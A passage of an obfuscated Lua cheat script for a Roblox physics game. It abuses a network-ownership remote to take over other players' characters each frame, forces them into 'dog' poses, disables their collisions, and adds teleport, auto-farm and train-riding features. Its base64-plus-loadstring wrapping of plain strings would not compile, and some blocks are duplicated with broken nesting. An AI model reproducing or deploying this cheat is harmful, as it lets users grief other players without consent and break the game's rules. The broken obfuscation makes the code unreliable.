        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if not hrp then
            continue
        end

        savedCFrame = hrp.CFrame

        local currentTime = TimeTextObj and TimeTextObj.Text

        if currentTime == targetTime then
            hrp.CFrame = CFrame.new(slotTeleportPosition)

            task.wait(1)
            pcall(function()
                ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(slotHandle, CFrame.new(slotTeleportPosition))
            end)
            task.wait(1)

            if hrp and hrp.Parent then
                hrp.CFrame = savedCFrame
            end
        end
    end
end

FarmGroup:CreateToggle({
    Name = loadstring(base64decode("QXV0byBTcGluIFNsb3Rz"))(),
    Flag = loadstring(base64decode("QXV0b0Zhcm1Ub2dnbGU="))(),
    Default = false,
    Callback = function(state)
        farmingActive = state
        if state then
            task.spawn(farmLoop)
        end
    end
})

LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild('HumanoidRootPart')
    if farmingActive then
        task.spawn(farmLoop)
    end
end)

do
    MiscGroup:CreateButton({
        Name = loadstring(base64decode("QnJpbmcgVHJhaW4gKFVzZSB2Zmx5IGluIElZKQ=="))(),
        Callback = function()
            -- 1. Dynamically fetch services and character variables so they never become loadstring(base64decode("c3RhbGU="))() after respawning
            local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
            local rs = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
            local plr = Players.LocalPlayer
            local char = plr.Character or plr.CharacterAdded:Wait()
            local HRP = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
            local hum = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
            local inv = workspace:FindFirstChild(plr.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
            
            local DestroyToy = rs:WaitForChild(loadstring(base64decode("TWVudVRveXM="))(), 5) and rs.MenuToys:FindFirstChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
            local SpawnToy = rs:WaitForChild(loadstring(base64decode("TWVudVRveXM="))(), 5) and rs.MenuToys:FindFirstChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))())

            -- Safety check
            if not HRP or not hum or not inv then return end

            -- 2. Helper Functions
            local function getplot()
                for xVec0uwV = 1, 5 do
                    local plot = workspace.Plots:FindFirstChild(loadstring(base64decode("UGxvdA=="))()..xVec0uwV)
                    local value = plot and plot:FindFirstChild(loadstring(base64decode("UGxvdFNpZ24="))()) and plot.PlotSign:FindFirstChild(loadstring(base64decode("VGhpc1Bsb3RzT3duZXJz"))()) and plot.PlotSign.ThisPlotsOwners:FindFirstChild(loadstring(base64decode("VmFsdWU="))())
                    if plot and value and value.Value:find(plr.Name) then
                        return plot
                    end
                end
                return nil
            end

            local function spawntoy(toy, cf)
                if plr:FindFirstChild(loadstring(base64decode("Q2FuU3Bhd25Ub3k="))()) and not plr.CanSpawnToy.Value then
                    plr.CanSpawnToy.Changed:Wait()
                end
                
                local t
                local toyadded
                toyadded = inv.ChildAdded:Connect(function(c)
                    if c.Name == toy then
                        t = c
                        toyadded:Disconnect()
                    end
                end)
                
                task.spawn(function()
                    pcall(function()
                        SpawnToy:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
                    end)
                end)
                
                local time = tick() + 1
                repeat task.wait() until t or tick() > time
                
                if t then
                    return t
                else
                    local plot = getplot()
                    if plot then
                        local plotItems = workspace:FindFirstChild(loadstring(base64decode("UGxvdEl0ZW1z"))())
                        if plotItems and plotItems:FindFirstChild(plot.Name) then
                            return plotItems[plot.Name]:FindFirstChild(toy) or plotItems[plot.Name]:WaitForChild(toy, 0.5)
                        end
                    end
                end
            end

            local function grab(obj)
                if obj and obj:FindFirstChild(loadstring(base64decode("SG9sZFBhcnQ="))()) and obj.HoldPart:FindFirstChild(loadstring(base64decode("SG9sZEl0ZW1SZW1vdGVGdW5jdGlvbg=="))()) then
                    pcall(function()
                        obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
                    end)
                end
            end

            -- 3. Main Execution Logic
            local pos = HRP.CFrame
            local burger = spawntoy(loadstring(base64decode("Rm9vZEhhbWJ1cmdlcg=="))(), HRP.CFrame)
            
            if burger then
                repeat task.wait() until burger:FindFirstChild(loadstring(base64decode("SG9sZFBhcnQ="))())
                
                local map = workspace:FindFirstChild(loadstring(base64decode("TWFw"))())
                local train = map and map:FindFirstChild(loadstring(base64decode("QWx3YXlzSGVyZVR3ZWVuZWRPYmplY3Rz"))()) and map.AlwaysHereTweenedObjects:FindFirstChild(loadstring(base64decode("VHJhaW4="))())
                
                if train and train:FindFirstChild(loadstring(base64decode("T2JqZWN0"))()) then
                    local trainObj = train.Object
                    local model = trainObj:FindFirstChild(loadstring(base64decode("T2JqZWN0TW9kZWw="))())
                    local followPart = trainObj:FindFirstChild(loadstring(base64decode("Rm9sbG93VGhpc1BhcnQ="))())
                    
                    -- Sit in the train
                    if model and model:FindFirstChild(loadstring(base64decode("U2VhdA=="))()) then
                        model.Seat:Sit(hum)
                    end
                    
                    -- Disable train physics alignment
                    if followPart then
                        if followPart:FindFirstChild(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))()) then
                            followPart.AlignPosition.Enabled = false
                        end
                        if followPart:FindFirstChild(loadstring(base64decode("QWxpZ25PcmllbnRhdGlvbg=="))()) then
                            followPart.AlignOrientation.Enabled = false
                        end
                    end
                end
                
                task.wait(0.1)
                grab(burger)
                task.wait(0.1)
                
                -- Cleanup
                pcall(function()
                    DestroyToy:FireServer(burger)
                end)
                
                -- Pop player back up
                HRP.CFrame = pos * CFrame.new(0, 5, 0)
            else
                if Library and Library.Notify then
                    Library:Notify({ Title = loadstring(base64decode("RXJyb3I="))(), Content = loadstring(base64decode("RmFpbGVkIHRvIHNwYXduIEhhbWJ1cmdlci4="))(), Duration = 3 })
                end
            end
        end
    })
end

PS.PlayerAdded:Connect(function(plr)
	if plr:IsFriendsWith(Player.UserId) then
		notify(loadstring(base64decode("Tm90aWZ5IGZyaWVuZA=="))(), plr.Name .. loadstring(base64decode("IGpvaW5lZA=="))(), 5)
	end
end)
do
local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local variants = {
	loadstring(base64decode("QmxhY2tIb2xl"))(),
	loadstring(base64decode("QmxhY2tfSG9sZQ=="))(),
	loadstring(base64decode("QmxhY2tob2xl"))(),
	loadstring(base64decode("QmxhY2stSG9sZQ=="))(),
	loadstring(base64decode("QkhvbGU="))(),
	loadstring(base64decode("Qkg="))(),
	loadstring(base64decode("Vm9pZEhvbGU="))(),
	loadstring(base64decode("Vm9pZA=="))(),
	loadstring(base64decode("Vm9pZFNwaGVyZQ=="))(),
	loadstring(base64decode("RGFya0hvbGU="))(),
	loadstring(base64decode("RGFya1NwaGVyZQ=="))(),
	loadstring(base64decode("RGFya09yYg=="))(),
	loadstring(base64decode("R3Jhdml0eUhvbGU="))(),
	loadstring(base64decode("R3Jhdml0eU9yYg=="))(),
	loadstring(base64decode("U3BhY2VIb2xl"))(),
	loadstring(base64decode("U3BhY2VPcmI="))(),
	loadstring(base64decode("U2luZ3VsYXJpdHk="))(),
	loadstring(base64decode("U2luZ3VsYXJpdHlPcmI="))(),
	loadstring(base64decode("RXZlbnRIb3Jpem9u"))(),
	loadstring(base64decode("QmxhY2tTcGhlcmU="))(),
	loadstring(base64decode("QW5vbWFseQ=="))(),
	loadstring(base64decode("QW5vbWFseUhvbGU="))(),
	loadstring(base64decode("U3VwZXJtYXNzaXZlSG9sZQ=="))(),
	loadstring(base64decode("UXVhbnR1bUhvbGU="))()
}

-- ===============================
-- RAGALIC CLIENT вЂў KICK NOTIFY
-- ===============================

local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
local SoundService = game:GetService(loadstring(base64decode("U291bmRTZXJ2aWNl"))())

local LocalPlayer = Players.LocalPlayer

-- ===============================
-- SOUND (BELL)
-- ===============================
function playKickSound()
	local s = Instance.new(loadstring(base64decode("U291bmQ="))())
	s.SoundId = loadstring(base64decode("cmJ4YXNzZXRpZDovLzc5MTUwNzg5MzM2NDgw"))() -- Bell (Deltarune)
	s.Volume = 5
	s.PlayOnRemove = true
	s.Parent = SoundService
	s:Destroy()
end

-- ===============================
-- NOTIFY (XOCU)
-- ===============================
function notifyKick(displayName, username)
	Library:Notify({ Title = loadstring(base64decode("SkpTS0Qg"))(), Content = displayName .. loadstring(base64decode("ICg="))() .. username .. loadstring(base64decode("KSBoYXMgYmVlbiBraWNrZWQgV1dX"))(), Duration = 6,
	 })
end

-- ===============================
-- HELPERS
-- ===============================
function getClosestPlayer(pos)
	local closestPlr = nil
	local closestDist = math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer and plr.Character then
			local hrp = plr.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
			if hrp then
				local dist = (hrp.Position - pos).Magnitude
				if dist < closestDist then
					closestDist = dist
					closestPlr = plr
				end
			end
		end
	end
	return closestPlr
end

-- ===============================
-- BLACK HOLE DETECT
-- ===============================
Workspace.ChildAdded:Connect(function(obj)
	if obj.Name == loadstring(base64decode("QmxhY2tIb2xlS2ljaw=="))() or obj.Name == loadstring(base64decode("QmxhY2tIb2xlRGV0ZWN0ZWQ="))() then
		task.wait(0.05)
		local pos
		if obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
			pos = obj.Position
		elseif obj:IsA(loadstring(base64decode("TW9kZWw="))()) and obj.PrimaryPart then
			pos = obj.PrimaryPart.Position
		end
		if not pos then
			return
		end
		local plr = getClosestPlayer(pos)
		if not plr then
			return
		end
		playKickSound()
		notifyKick(plr.DisplayName, plr.Name)
	end
end)
end

-- Auras Group


local KeybindsGroup = Tabs.Keybinds:CreateBlock({Name = loadstring(base64decode("S2V5YmluZDE="))(), Side = loadstring(base64decode("TGVmdA=="))()})
local UserInputService = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())

local Player = Players.LocalPlayer
local Mouse = Player:GetMouse()

local tpEnabled = true -- РјРѕР¶РЅРѕ СѓР±СЂР°С‚СЊ, РµСЃР»Рё РЅРµ РЅСѓР¶РµРЅ on/off

KeybindsGroup:CreateKeybind({
	Name = loadstring(base64decode("VGVsZXBvcnQgdG8gTW91c2U="))(),
	Flag = loadstring(base64decode("VFBLZXliaW5k"))(),
	Default = loadstring(base64decode("WA=="))(),
	Callback = function()
		if not tpEnabled then
			return
		end
		local character = Player.Character
		local hrp = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
		if not hrp then
			return
		end
		local targetPos = Mouse.Hit.Position
		hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
	end
})
-- =========================================================================
-- LOOPGRAB POSE [DOG] (INTEGRATED INTO KEYBINDSGROUP)
-- =========================================================================
do
    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    local LocalPlayer = Players.LocalPlayer

    local loopGrabDogActive = false
    local LoopGrabDogConn = nil
    local SpamChar = nil

    local function stopDogPose()
        loopGrabDogActive = false
        if LoopGrabDogConn then
            LoopGrabDogConn:Disconnect()
            LoopGrabDogConn = nil
        end
        
        -- Restore collisions and velocities
        if SpamChar and SpamChar.Parent and SpamChar:FindFirstChild(loadstring(base64decode("SGVhZA=="))()) then 
            for _, v in pairs(SpamChar:GetChildren()) do 
                if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then 
                    v.AssemblyLinearVelocity = Vector3.zero
                    v.AssemblyAngularVelocity = Vector3.zero
                    v.CanCollide = true
                end
            end
        end
        SpamChar = nil
    end

    local function startDogPose()
        local Mouse = LocalPlayer:GetMouse()
        local target = Mouse.Target
        if not target then 
            Library:Notify({ Title = loadstring(base64decode("U3lzdGVt"))(), Content = loadstring(base64decode("Tm8gdGFyZ2V0IGZvdW5kIHVuZGVyIG1vdXNlIQ=="))(), Duration = 3 })
            return 
        end
        
        SpamChar = target.Parent
        local Head = SpamChar:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
        local Torso = SpamChar:FindFirstChild(loadstring(base64decode("VG9yc28="))()) or SpamChar:FindFirstChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))())
        local Hum = SpamChar:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
        
        if not (Torso and Head and Hum) then 
            SpamChar = nil
            Library:Notify({ Title = loadstring(base64decode("U3lzdGVt"))(), Content = loadstring(base64decode("SW52YWxpZCBjaGFyYWN0ZXIgdGFyZ2V0IQ=="))(), Duration = 3 })
            return 
        end
        
        loopGrabDogActive = true
        local snoRemote = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))(), 5) and ReplicatedStorage.GrabEvents:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
        local myChar = LocalPlayer.Character
        local hrp = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        
        Library:Notify({ Title = loadstring(base64decode("RG9nIFBvc2U="))(), Content = loadstring(base64decode("TG9ja2VkIG9udG8g"))() .. SpamChar.Name, Duration = 3 })

        LoopGrabDogConn = RunService.Heartbeat:Connect(function()
            if not loopGrabDogActive or not hrp or not SpamChar or not SpamChar.Parent then
                stopDogPose()
                return
            end
            
            Torso = SpamChar:FindFirstChild(loadstring(base64decode("VG9yc28="))()) or SpamChar:FindFirstChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))())
            Head = SpamChar:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
            if not Torso or not Head then 
                stopDogPose()
                return 
            end
            
            -- Claim Network Ownership
            if snoRemote then
                pcall(function() snoRemote:FireServer(Head, Head.CFrame) end)
            end
            
            -- Ghosting collisions
            for _, x in pairs(SpamChar:GetDescendants()) do 
                if x:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then 
                    x.CanCollide = false
                end
            end
            
            Hum.Health = 100 -- Prevent dying from physics glitches
            
            -- Force Dog Pose CFrames relative to your HRP
            Torso.CFrame = hrp.CFrame * CFrame.new(0, -1, -2) * CFrame.Angles(math.rad(-90), 0, math.rad(180))
            Head.CFrame = Torso.CFrame * CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(90), 0, 0)
            
            local lArm = SpamChar:FindFirstChild(loadstring(base64decode("TGVmdCBBcm0="))())
            if lArm then lArm.CFrame = Torso.CFrame * CFrame.new(-1, 0.5, 0) * CFrame.Angles(math.rad(60), 0, math.rad(-30)) end
            
            local rArm = SpamChar:FindFirstChild(loadstring(base64decode("UmlnaHQgQXJt"))())
            if rArm then rArm.CFrame = Torso.CFrame * CFrame.new(1, 0.5, 0) * CFrame.Angles(math.rad(60), 0, math.rad(30)) end
            
            local lLeg = SpamChar:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))())
            if lLeg then lLeg.CFrame = Torso.CFrame * CFrame.new(-0.5, -1, 0) * CFrame.Angles(math.rad(40), 0, 0) end
            
            local rLeg = SpamChar:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))())
            if rLeg then rLeg.CFrame = Torso.CFrame * CFrame.new(0.5, -1, 0) * CFrame.Angles(math.rad(40), 0, 0) end
        end)
    end
-- =========================================================================
-- LOOPGRAB POSE [DOG] (REFINED ANATOMY)
-- =========================================================================
do
    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    local LocalPlayer = Players.LocalPlayer

    local loopGrabDogActive = false
    local LoopGrabDogConn = nil
    local SpamChar = nil

    local function stopDogPose()
        loopGrabDogActive = false
        if LoopGrabDogConn then
            LoopGrabDogConn:Disconnect()
            LoopGrabDogConn = nil
        end
        if SpamChar and SpamChar.Parent then 
            for _, v in pairs(SpamChar:GetDescendants()) do 
                if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then 
                    v.AssemblyLinearVelocity = Vector3.zero
                    v.CanCollide = true
                end
            end
        end
        SpamChar = nil
    end

    local function startDogPose()
        local Mouse = LocalPlayer:GetMouse()
        local target = Mouse.Target
        if not target or not target.Parent:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))()) then return end
        
        SpamChar = target.Parent
        loopGrabDogActive = true
        
        local snoRemote = ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()) and ReplicatedStorage.GrabEvents:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
        
        LoopGrabDogConn = RunService.Heartbeat:Connect(function()
            if not loopGrabDogActive or not hrp or not SpamChar:FindFirstChild(loadstring(base64decode("VG9yc28="))()) then stopDogPose() return end
            
            local Torso = SpamChar.Torso
            local Head = SpamChar:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
            
            -- Network Ownership
            if snoRemote then pcall(function() snoRemote:FireServer(Head, Head.CFrame) end) end
            
            -- Dog Math: Torso horizontal, limbs tucked under
            Torso.CFrame = hrp.CFrame * CFrame.new(0, -1.2, -2.5) * CFrame.Angles(math.rad(-90), 0, 0)
            
            if Head then 
                Head.CFrame = Torso.CFrame * CFrame.new(0, 1.3, -0.2) * CFrame.Angles(math.rad(45), 0, 0) 
            end
            
            -- Limbs as Paws
            local LArm = SpamChar:FindFirstChild(loadstring(base64decode("TGVmdCBBcm0="))())
            local RArm = SpamChar:FindFirstChild(loadstring(base64decode("UmlnaHQgQXJt"))())
            local LLeg = SpamChar:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))())
            local RLeg = SpamChar:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))())
            
            if LArm then LArm.CFrame = Torso.CFrame * CFrame.new(-0.8, 0.5, 0.5) * CFrame.Angles(math.rad(90), 0, math.rad(20)) end
            if RArm then RArm.CFrame = Torso.CFrame * CFrame.new(0.8, 0.5, 0.5) * CFrame.Angles(math.rad(90), 0, math.rad(-20)) end
            if LLeg then LLeg.CFrame = Torso.CFrame * CFrame.new(-0.6, -1.2, 0.5) * CFrame.Angles(math.rad(90), 0, math.rad(10)) end
            if RLeg then RLeg.CFrame = Torso.CFrame * CFrame.new(0.6, -1.2, 0.5) * CFrame.Angles(math.rad(90), 0, math.rad(-10)) end
            
            -- Disable collisions so they don't bounce
            for _, p in pairs(SpamChar:GetDescendants()) do if p:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then p.CanCollide = false end end
        end)
    end

    KeybindsGroup:CreateKeybind({
        Name = loadstring(base64decode("RG9nIFBvc2UgUXVpY2sgVjE="))(),
        Flag = loadstring(base64decode("RG9nUG9zZUtleQ=="))(),
        Default = loadstring(base64decode("VA=="))(),
        Callback = function()
            if loopGrabDogActive then
                stopDogPose()
            else
                startDogPose()
            end
        end
    })
end
    -- Auto-bind for T (Spam keybind) within KeybindsGroup
    KeybindsGroup:CreateKeybind({
        Name = loadstring(base64decode("RG9nIFBvc2UgUXVpY2sgVjI="))(),
        Flag = loadstring(base64decode("RG9nUG9zZUtleQ=="))(),
        Default = loadstring(base64decode("VA=="))(),
        Callback = function()
            local newState = not loopGrabDogActive
            SetToggleState(loadstring(base64decode("TG9vcEdyYWJfRG9n"))(), newState)
            
            -- If you want the toggle visually updated in the UI, you may need to call Options[loadstring(base64decode("TG9vcEdyYWJfRG9n"))()]:Set(newState) depending on your UI library.
            
            if newState then
                startDogPose()
            else
                stopDogPose()
                Library:Notify({ Title = loadstring(base64decode("RG9nIFBvc2U="))(), Content = loadstring(base64decode("RGVhY3RpdmF0ZWQ="))(), Duration = 3 })
            end
        end
    })
end

do

    local FGM = {}
    FGM.Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    FGM.RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
    FGM.ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    FGM.UserInputService = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
    FGM.Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
    FGM.TweenService = game:GetService(loadstring(base64decode("VHdlZW5TZXJ2aWNl"))())
    FGM.LocalPlayer = FGM.Players.LocalPlayer
    FGM.Mouse = FGM.LocalPlayer:GetMouse()

    local GrabFolder = FGM.ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()) or FGM.ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))(), 10)
    FGM.GrabEvents = GrabFolder
    FGM.SetNetworkOwner = GrabFolder and (GrabFolder:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))()) or GrabFolder:WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))(), 5))
    FGM.DestroyLine = GrabFolder and (GrabFolder:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))()) or GrabFolder:WaitForChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))(), 5))
    FGM.CreateLine = GrabFolder and (GrabFolder:FindFirstChild(loadstring(base64decode("Q3JlYXRlR3JhYkxpbmU="))()) or GrabFolder:WaitForChild(loadstring(base64decode("Q3JlYXRlR3JhYkxpbmU="))(), 5))

    local MenuToys = FGM.ReplicatedStorage:FindFirstChild(loadstring(base64decode("TWVudVRveXM="))()) or FGM.ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))(), 10)
    FGM.MenuToys = MenuToys
    FGM.ToySpawn = MenuToys and (MenuToys:FindFirstChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))()) or MenuToys:WaitForChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))(), 5))
    FGM.DestroyToy = MenuToys and (MenuToys:FindFirstChild(loadstring(base64decode("RGVzdHJveVRveQ=="))()) or MenuToys:WaitForChild(loadstring(base64decode("RGVzdHJveVRveQ=="))(), 5))

    FGM.State = {
        FigureGrabEnabled = false,
        FigureGrabConnection = nil,
        TargetCharacter = nil,
        TargetPlayer = nil,
        AnimationCopyEnabled = false,
        VectorZero = Vector3.new(0, 0, 0),
        PalletForRagdoll = nil,
        RagdollConnections = {},
        LoopRagdollEnabled = false,
        RespawnConnection = nil,
        RejoinConnection = nil,
        SmoothedCFrames = {},
        SelectedLimb = 'Torso',
        AutoGrabActive = false,
        AutoGrabConnection = nil,
        LastGrabTargetRef = nil,
        DistanceTPInProgress = false,
        FreezeLimbsEnabled = false,
        FrozenCFrames = {},
        VelSuppressEnabled = false,
        GravityFlipEnabled = false,
        LockRotationEnabled = false,
        LockedRotation = CFrame.identity,
        ForceLookAtEnabled = false,
        ForceUprightEnabled = false,
        FlingOnReleaseEnabled = false,
        FlingForce = 300,
        HoldAtCameraEnabled = false,
        OscillateEnabled = false,
        OscillateSpeed = 2,
        OscillateAmount = 3,
        OscillateTimer = 0,
        SpinEnabled = false,
        SpinSpeed = 180,
        SpinAngle = 0,
        ActiveNetworkTarget = nil,
        HighlightedLimb = nil,
        LimbHighlight = nil,
        PersistentGrabActive = false,
        PersistentGrabThread = nil,
        SavedPosition = nil,
        AutoRagdollToggle = false,
        AutoRagdollEnabled = false,
        AutoRagdollConnection = nil,
        RagdollPallet = nil,
        RagdollSoundPart = nil,
        SeveralEnabled = false,
        SeveralTargets = {},
        LastTargetUserId = nil,
        LastTargetHRP = nil,
        IsReturning = false,
        SelectedTarget = nil,
    }

    FGM.Configuration = {
        DampingEnabled = true,
        DampingSpeed = 12,
        SnapEnabled = false,
        SnapPosStep = 0.5,
        SnapRotStep = 15,
        LineDistance = 0,
        AutoTPDistance = 40,
        HoldPosition = { X = 0, Y = 0, Z = -5 },
        HoldRotation = { X = 0, Y = 0, Z = 0 },
        LeftArmPosition = { X = 0, Y = 0, Z = 0 },
        LeftArmRotation = { X = 0, Y = 0, Z = 0 },
        RightArmPosition = { X = 0, Y = 0, Z = 0 },
        RightArmRotation = { X = 0, Y = 0, Z = 0 },
        LeftLegPosition = { X = 0, Y = 0, Z = 0 },
        LeftLegRotation = { X = 0, Y = 0, Z = 0 },
        RightLegPosition = { X = 0, Y = 0, Z = 0 },
        RightLegRotation = { X = 0, Y = 0, Z = 0 },
        HeadPosition = { X = 0, Y = 0, Z = 0 },
        HeadRotation = { X = 0, Y = 0, Z = 0 },
    }

    FGM.Presets = {
        Pose1 = {
            HoldPosition = { X = 0, Y = 0, Z = -7.5 },
            HoldRotation = { X = 90, Y = 0, Z = 108 },
            LeftArmPosition = { X = -1.5, Y = 1, Z = -1 },
            LeftArmRotation = { X = 283, Y = 0, Z = 0 },
            RightArmPosition = { X = 1.5, Y = 0.5, Z = 1 },
            RightArmRotation = { X = 270, Y = 0, Z = 0 },
            LeftLegPosition = { X = 0.5, Y = -1.5, Z = 0.5 },
            LeftLegRotation = { X = 312, Y = 0, Z = 0 },
            RightLegPosition = { X = -0.5, Y = -1.5, Z = 0.5 },
            RightLegRotation = { X = 283, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 1.5, Z = 0 },
            HeadRotation = { X = 0, Y = 0, Z = 0 },
        },
        Pose2 = {
            HoldPosition = { X = 0, Y = -1.5, Z = -12.5 },
            HoldRotation = { X = 272, Y = 0, Z = 0 },
            LeftArmPosition = { X = -1, Y = 1, Z = -0.5 },
            LeftArmRotation = { X = 90, Y = 0, Z = 0 },
            RightArmPosition = { X = 1, Y = 1, Z = -0.5 },
            RightArmRotation = { X = 90, Y = 0, Z = 0 },
            LeftLegPosition = { X = 1, Y = -1, Z = -0.5 },
            LeftLegRotation = { X = 90, Y = 0, Z = 0 },
            RightLegPosition = { X = -1, Y = -1, Z = -0.5 },
            RightLegRotation = { X = 90, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 1, Z = 1 },
            HeadRotation = { X = 90, Y = 0, Z = 0 },
        },
        Pose3 = {
            HoldPosition = { X = 0, Y = -5.5, Z = -4 },
            HoldRotation = { X = 0, Y = 0, Z = 0 },
            LeftArmPosition = { X = 1, Y = 7.5, Z = 1.5 },
            LeftArmRotation = { X = 0, Y = 0, Z = 0 },
            RightArmPosition = { X = 1, Y = 6, Z = 1.5 },
            RightArmRotation = { X = 0, Y = 0, Z = 0 },
            LeftLegPosition = { X = 0.5, Y = 5, Z = 1.5 },
            LeftLegRotation = { X = 0, Y = 0, Z = 92 },
            RightLegPosition = { X = -0.5, Y = 5, Z = 1.5 },
            RightLegRotation = { X = 0, Y = 0, Z = 90 },
            HeadPosition = { X = 0, Y = 0, Z = 0 },
            HeadRotation = { X = 0, Y = 0, Z = 0 },
        },
        Pose4 = {
            HoldPosition = { X = 1.5, Y = -8.5, Z = -1.5 },
            HoldRotation = { X = 0, Y = 0, Z = 0 },
            LeftArmPosition = { X = 0, Y = 0, Z = 0 },
            LeftArmRotation = { X = 0, Y = 0, Z = 0 },
            RightArmPosition = { X = 0, Y = 0, Z = 0 },
            RightArmRotation = { X = 0, Y = 0, Z = 0 },
            LeftLegPosition = { X = 0, Y = 0, Z = 0 },
            LeftLegRotation = { X = 0, Y = 0, Z = 0 },
            RightLegPosition = { X = 1.5, Y = 0, Z = 0 },
            RightLegRotation = { X = 0, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 9, Z = 0 },
            HeadRotation = { X = 0, Y = 0, Z = 0 },
        },
        Pose5 = {
            HoldPosition = { X = 0, Y = -3, Z = -6 },
            HoldRotation = { X = 270, Y = 0, Z = 0 },
            LeftArmPosition = { X = -1, Y = 0.5, Z = 0 },
            LeftArmRotation = { X = 180, Y = 0, Z = 0 },
            RightArmPosition = { X = 1, Y = 0.5, Z = 0 },
            RightArmRotation = { X = 180, Y = 0, Z = 0 },
            LeftLegPosition = { X = 0, Y = -3, Z = 0 },
            LeftLegRotation = { X = 0, Y = 0, Z = 0 },
            RightLegPosition = { X = 0, Y = -2, Z = 0.5 },
            RightLegRotation = { X = 45, Y = 0, Z = 0 },
            HeadPosition = { X = 0, Y = 1.5, Z = -0.5 },
            HeadRotation = { X = 270, Y = 0, Z = 0 },
        },
        Pose6 = {
            HoldPosition = { X = 5.5, Y = 0.5, Z = -1.5 },
            HoldRotation = { X = 345, Y = 39, Z = 0 },
            LeftArmPosition = { X = 2, Y = 0.5, Z = 0 },
            LeftArmRotation = { X = 0, Y = 43, Z = 121 },
            RightArmPosition = { X = -2, Y = 0, Z = 0 },
            RightArmRotation = { X = 64, Y = 112, Z = 0 },
            LeftLegPosition = { X = -0.5, Y = -2, Z = 0 },
            LeftLegRotation = { X = 349, Y = 0, Z = 360 },
            RightLegPosition = { X = 0.5, Y = -2, Z = 0 },
            RightLegRotation = { X = 345, Y = 360, Z = 10 },
            HeadPosition = { X = 0, Y = 1.5, Z = 0 },
            HeadRotation = { X = 0, Y = 344, Z = 0 },
        },
        Pose7 = {
            HoldPosition = { X = 0, Y = -2, Z = -10 },
            HoldRotation = { X = 90, Y = 0, Z = 0 },
            LeftArmPosition = { X = -1.5, Y = 0, Z = 0 },
            LeftArmRotation = { X = 270, Y = 0, Z = 315 },
